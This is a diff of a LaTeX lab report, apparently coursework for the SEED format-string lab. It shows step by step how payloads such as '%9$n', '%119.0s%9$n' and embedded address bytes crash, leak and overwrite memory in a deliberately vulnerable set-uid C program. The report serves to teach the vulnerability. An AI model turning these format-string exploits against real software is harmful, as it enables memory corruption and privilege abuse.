@@ -1,42 +1,242 @@
 % A technical part, describing what you did and how/why it works. Imagine that you are writing for another student who has not taken this unit: they should be able, after reading your technical part, to both reproduce your attacks by following the steps you give and to have a basic understanding of what is happening.
 
-\fakesection{About Format Strings}
-In the C language, the \emph{printf()} family of printing functions interpret what is known as \emph{format strings} to provide a way of combining a string literal with zero or more other types of data.
+\subsection{Context}
+In the C language, format strings provide a way of combining string literals with zero or more other types of data. The following is a subset of the format string substitutions that are important to this exercise:
 
-\vgap\begin{lstlisting}[frame=single]
-int printf(const char * restrict format, ...);
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Format string substitutions},
+language=,
+frame=single]
+%d                  Signed integer
+%s                  Null-terminated string
+%x                  Signed integer in hexadecimal form
+%p                  Address in hexadecimal form
+%n                  Number of bytes printed up to this token
+%<index>$<type>     Indexed substitution form
 \end{lstlisting}
-\begin{lstlisting}[frame=single]
-printf("Hello %s, this is printf.\n", name);
+\end{minipage}
+
+The \emph{\%n} token is special, because it writes to its corresponding parameter by treating it as a pointer. On the other hand, the indexed substitution form is useful either to refer to the same substitution variable multiple times, or to skip having to repeat the same token many times. For more details about the \emph{printf()} family of functions, the reader is referred to \cite{printf3}.
+
+In this Lab we focus on the misuse of the \emph{printf()}, whereby a user-entered string is passed as the format string. Such mistake allows the user to control substitution tokens in ways that can violate the actual number of substitution variables supplied. This vulnerability was intentionally created in \emph{formatstring.c}:
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Vulnerable part in formatstring.c},
+label={lst:l1_pa_ex},
+frame=single]
+char user_input[100];
+...
+scanf("%s", user_input);
+printf(user_input);
 \end{lstlisting}
+\end{minipage}
 
-The use of format strings range widely from the simplest Hello World program (albeit with no substitution) to some of the most crucial and privileged programs in a system - even the Unix kernel has its own \emph{printk()} function. The format string mechanism has considerable impact on many systems and therefore every programmer should know how to use it safely.
+If the user enters a valid format string, it will be faithfully parsed by \emph{printf()} even though no substitution variables were supplied. This means that instead of  stopping when there are no more substitution variables to consume, \emph{printf()} continues accessing stack data until all tokens are respected.
 
-Some of the most commonly used substitutions are: \emph{\%d}, \emph{\%f}, and \emph{\%s}, which stand for signed integer, float, and null-terminate string, respectively. For a full description on \emph{printf()} substitutions, the reader is referred to [C printf manual].
+In the following sections, we use \emph{formatstring.c} to demonstrate how the format string vulnerability can lead to leakage and overwrite of important data. \emph{formatstr-root} is the set-uid version of \emph{formatstring}. This document also comes with two auto-exploit scripts written in Python: \emph{cwk1\_p1.py}, and \emph{cwk1\_p2.py}.2.
 
-\fakesection{The Problem with Format Strings}
-The argument list of \emph{printf()} is variable in length, and the programmer is responsible for providing as many substitution variables as substitution tokens they have requested in the format. This responsibility is often mishandled, due to factors such as carelessness, ignoring compiler warnings, or just not knowing that it is an issue. Below we demonstrate a program that compromises itself simply by using too many \emph{\%s} tokens:
+\subsection{Task 1}
+\subsubsection{Part (a) Crash the Program}
+In order to consistently crash the program, we first inspect the stack so as to gather information that we might leverage. To understand how this was possible, the call stack structure is illustrated:
 
-\vgap
-\begin{lstlisting}[frame=single]
-const char *password = "mypassword";
-const char *name = "John";
-printf("Hello %s! %s, %s, %s, %s, %s, %s\n", name);
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Stack frame illustration},
+language=,
+label={lst:l1_pa_stack},
+frame=single]
+...
+main()  |    Local variables of main()
+        |    Saved registers of main()
+        |    Argument #N for printf()
+        |    Argument... for printf()
+        |    Argument #2 for printf()
+        |    Argument #1 for printf()
+        printf()    |    Return address to main()
+                    |    Stack frame address of main()
+                    |    Local variables of printf()
+                    |    ...(stack grows downwards)
 \end{lstlisting}
+\end{minipage}
 
-By running this \textit{made up example} on the SEED virtual machine, we get:
+The stack structure in \lstref{lst:l1_pa_stack} suggests that reading past (above) the argument list would expose saved register values of the caller. We test this by running \emph{formatstr-root} and entering "\%x,\%x". Note that at this stage, the choice of the integer input does not matter. The execution results in two values being printed off the stack: \emph{bf978d88} and \emph{1}. The first value appears to be some address, while the second value seems to remain the same in every run. We then use the \emph{\%s} token to interpret the second value as an address, generating a segmentation fault (addresses near 0 are almost never accessible). The full payload is "\%2\$s", which translates into "treat the second argument as a char pointer, dereference it, and then display it".
 
-\vgap
-\begin{lstlisting}[frame=single]
-Hello John! |M, ??[Í??, U??WVS? ?, (null), mypassword, John
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={De-referencing invalid address},
+frame=single]
+...
+Please enter a string
+%2$s
+Segmentation fault (core dumped)
 \end{lstlisting}
+\end{minipage}
 
-As can be seen, the password variable (with the value "mypassword") is exposed to the user. Of course, this is very poor coding to begin with, and the number of \textit{\%s} tokens is dramatic. However, it serves to show that information can be exposed unintentionally due to improper use of format strings.
+\subsubsection{Part (b) Print out the value of secret[1]}
+Since the data pointed to by \emph{secret} is allocated on the heap, an indirection (i.e. de-referencing) is required for its access. The heap address itself thus needs to be written somewhere. This time, the integer input becomes useful.
 
-This vulnerability exists because the format string mechanism does not check for extraneous substitution tokens (although any modern compiler will complain about it). The format parsing look continues taking substitution tokens and reading up the stack:
+We approach this attack by firstly locating the stack position or the \emph{argument index} of the integer input. This was achieved by entering arbitrarily many \emph{\%d} tokens with an easily identifiable integer input value. \lstref{lst:l1_pb_argind} shows that our integer input \emph{13371337} took the stack position of 9.
 
+From now on, we can simply enter the address of secret[1] in decimal as the integer input, and then access it via \emph{"\%9\$.1s"}. This payload translates to: "treat the ninth argument as a char pointer, dereference it, and then display the first character". To read out the four byte value of \emph{secret[1]}, we send the payload four times (read one byte at a time), each time incrementing one byte from its base address. This process is shown in \lstref{lst:l1_pb_o1} and \lstref{lst:l1_pb_o2}. We chose to read the value of secret[1] byte-by-byte because the simple \emph{\%s} token has the danger of interpreting non null-terminated data that might overun readable address and cause a segmentation fault.
 
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Locating integer input},
+label={lst:l1_pb_argind},
+language=,
+frame=single]
+...
+Please enter a decimal integer
+13371337
+Please enter a string
+%d,%d,%d,%d,%d,%d,%d,%d,%d,%d
+-1075410664,1,-1218346231,-1075410625,-1075410626,0,-1075410396,
+134914056,13371337,623666213
+...
+\end{lstlisting}
+\end{minipage}
 
-%what we did
+\begin{minipage}[t]{.48\textwidth}
+\begin{lstlisting}[caption={Printing out secret{$[1]$} bytes 0 and 1},
+label={lst:l1_pb_o1},
+language=,
+frame=single]
+... address is 0x 8ffd00c
+Please enter a decimal integer
+150982668
+Please enter a string
+%9$.1s
+U
+...
+... address is 0x 9ab700c
+Please enter a decimal integer
+150982668
+Please enter a string
+%9$.1s
 
-%how/why did what we did work
+...
+\end{lstlisting}
+\end{minipage}
+\hfill
+\begin{minipage}[t]{.48\textwidth}
+\begin{lstlisting}[caption={Printing out secret{$[1]$} bytes 2 and 3},
+label={lst:l1_pb_o2},
+language=,
+frame=single]
+... address is 0x 8b8a00c
+Please enter a decimal integer
+146317326
+Please enter a string
+%9$.1s
+
+...
+... address is 0x 86ae00c
+Please enter a decimal integer
+141221904
+Please enter a string
+%9$.1s
+
+...
+\end{lstlisting}
+\end{minipage}
+
+The single character outputs from \lstref{lst:l1_pb_o1} and \lstref{lst:l1_pb_o2} are "\emph{U}", "\emph{(nothing)}", "\emph{(nothing)}", and "\emph{(nothing)}". By converting to ASCII codes and reversing the little-endian order, we arrive at \emph{0x55}, which matches the true value of secret[1].
+
+\subsubsection{Part (c) Modify the value of secret[1]}
+To modify secret[1], the \emph{\%n} token becomes crucial. Using the same integer input addressing method discussed in part (b), we construct the payload: "\%9\$n". This payload translates to: "treat the ninth argument as an integer address, dereference it, and then write zero into it". This payload sets secret[1] to zero because the payload itself led to no bytes being printed, and the ninth argument was set to the address of secret[1] by the integer input. \lstref{lst:l1_pc_o} illustrates the use of this payload.
+
+\subsubsection{Part (d) Set secret[1] to a specific value}
+Building on top of part (c), we gain the ability to set any pointed heap variable to almost any value with the payload "\%$<$val$>$.0s\$9n". The format syntax of this payload tells \emph{printf()} to produce $<$val$>$ number of white spaces, and then print zero characters from whichever string argument it is referencing to. The payload was used to set secret[1] to \emph{0x77} in \lstref{lst:l1_pd_o}.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Setting secret{$[1]$} to 0},
+label={lst:l1_pc_o},
+language=,
+frame=single]
+...
+secret[1]'s address is 0x 9a6700c (on heap)
+Please enter a decimal integer
+161902604
+Please enter a string
+%9$n
+
+The original secrets: 0x44 -- 0x55
+The new secrets:      0x44 -- 0x0
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Setting secret{$[1]$} to 0x77},
+label={lst:l1_pd_o},
+language=,
+frame=single]
+...
+secret[1]'s address is 0x 996700c (on heap)
+Please enter a decimal integer
+160854028
+Please enter a string
+%119.0s%9$n
+
+The original secrets: 0x44 -- 0x55
+The new secrets:      0x44 -- 0x77
+\end{lstlisting}
+\end{minipage}
+
+\subsection{Task 2}
+In Task 2, \emph{formatstring.c} is stripped of the integer input. This effectively forbids the setting of the address as practiced in Task 1, and left the format string to be the only interaction with the program. While this does not affect the payload used to crash the program, parts (b), (c), and (d) require a new method of getting an address to secret[1].
+
+Since the \emph{user\_input} char array is on the stack, it should be possible to access it via an indexed substitution token. In \lstref{lst:l1_t2_insp}, we inspected the stack again and found that \emph{user\_input} was the tenth argument ("RIPP" translates to 0x50504952 in hex).
+
+After locating the "scratch pad" argument, we converted the address of secret[1] to escaped bytes and embeded them in the format string in little-endian order. \lstref{lst:l1_t2_le_pb} demonstrates this, along with the payload that printed out the first character of the pointed address. The result is the same as Task 1: 'U' (=\emph{0x55}). Other bytes are read by repeating the process with different offsets; their outputs are ommitted here since they are all null.
+
+Finally, after applying the same technique to create the address of secret[1] in the first four bytes of \emph{user\_input}, the second half of the payload used in Task 1 part (d) can be reused. Parts (c) and (d) are achieved as shown in \lstref{lst:l1_t2_le_pcd}.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Stack inspection to find the start of user\_input},
+label={lst:l1_t2_insp},
+language=,
+frame=single]
+...
+Please enter a string
+RIPPAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+RIPPAAAA,0xbffff678,0x8,0xb7eb8309,0xbffff69f,0xbffff69e,
+(nil),0xbffff784,0xbffff724,0x804b020,0x50504952,0x41414141,
+0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c702
+...
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Little-endian conversion and reading one byte},
+label={lst:l1_t2_le_pb},
+language=,
+frame=single]
+...
+secret[1]'s address is 0x 804b024 (on heap)
+Please enter a string
+\x24\xb0\x04\x08<%10$.1s>
+$<U>
+...
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Writing value 0xde to secret{$[1]$}},
+label={lst:l1_t2_le_pcd},
+language=,
+frame=single]
+...
+secret[1]'s address is 0x 804b024 (on heap)
+Please enter a string
+\x24\xb0\x04\x08%218.0s%10$n
+$
+The original secrets: 0x44 -- 0x55
+The new secrets:      0x44 -- 0xde
+\end{lstlisting}
+\end{minipage}
+
+\subsection{Task 3}
+\subsubsection{Part (a) Redo Task 2 with ASLR turned on}
+When ASLR is turned on, we see that the payloads documented in Task 2 fail about half of the time. After some analysis, we identified that some bytes were not being delivered properly to the memory as raw bytes. For example, \emph{0x09} (tab, or '{\textbackslash}t'), gets interpreted and removed by \emph{printf()} and does not set the memory correctly. These "bad bytes" from ASLR's address randomisation seem to be the culprit causing the payload failures.
+
+To circumvent this, we dropped the byte escaping method and attempted to set the address using the "space-generator" payload, "\%$<$val$>$.0s", followed by a \emph{\%n}. Unfortunately, this took way too long as the terminal kept on printing spaces to the size of the target address (hundreds of millions). Futher constraints in time meant that we were unable to find a complete solution on this part.
+
+\subsubsection{Part (b) Automate Task 2 (b)}
+As mentioned earlier, this document comes with two solution files written in Python: \emph{cwk1\_p1.py} and \emph{cwk1\_p2.py}. Each of them automatically execute all of the exploits in Task 1 and Task 2 respectively. The code uses \emph{pexpect}. It parses the addresses printed by \emph{formatstring} and automatically re-establishes the correct "scratch pad" argument.
